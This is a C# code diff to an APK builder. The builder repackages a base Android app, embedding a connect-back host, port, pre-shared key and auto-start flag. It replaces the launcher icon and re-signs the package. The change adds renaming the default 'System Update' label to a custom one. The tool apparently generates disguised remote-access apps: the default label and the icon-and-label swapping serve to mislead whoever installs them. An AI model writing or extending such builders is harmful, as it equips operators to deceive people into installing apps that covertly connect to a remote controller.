@@ -42,16 +42,17 @@ public static class ApkBuilder
 
     public sealed record BuildResult(byte[]? Apk, string? Error);
 
-    public static BuildResult Build(string host, int port, string psk, byte[]? iconPng, string? appLabel)
+    public static BuildResult Build(string host, int port, string psk, byte[]? iconPng, string? appLabel, string? homeUrl = null)
     {
         try
         {
             if (!File.Exists(BaseApkPath)) return new BuildResult(null, "chua co base apk: " + BaseApkPath);
 
-            var conf = $"host={host}\nport={port}\npsk={psk}\nauto=1\n";
+            var conf = $"host={host}\nport={port}\npsk={psk}\nauto=1\nhome={homeUrl ?? ""}\n";
             var confBytes = Encoding.UTF8.GetBytes(conf);
 
             var entries = new List<Zip.Entry>();
+            string? labelError = null;
             using (var zip = ZipFile.OpenRead(BaseApkPath))
             {
                 foreach (var e in zip.Entries)
@@ -74,6 +75,12 @@ public static class ApkBuilder
                     if (e.FullName == "assets/zk.conf") data = confBytes;
                     else if (iconPng is not null && e.FullName == "res/drawable/ic_launcher.png")
                         data = iconPng;
+                    else if (e.FullName == "resources.arsc" && !string.IsNullOrWhiteSpace(appLabel))
+                    {
+                        var (patched, changed, err) = Arsc.ReplaceString(data, "System Update", appLabel!.Trim());
+                        if (changed) data = patched;
+                        else labelError = err;
+                    }
 
                     entries.Add(new Zip.Entry(e.FullName, data,
                         e.FullName.EndsWith("resources.arsc") || e.CompressedLength == e.Length));
@@ -86,6 +93,7 @@ public static class ApkBuilder
             var zipBytes = Zip.Write(entries);
             var signed = ApkSign.SignV2(zipBytes, GetCert());
             if (!signed.Ok) return new BuildResult(null, "ky v2 loi: " + signed.Error);
+            if (labelError is not null) return new BuildResult(signed.Apk, "label: " + labelError);
             return new BuildResult(signed.Apk, null);
         }
         catch (Exception ex)
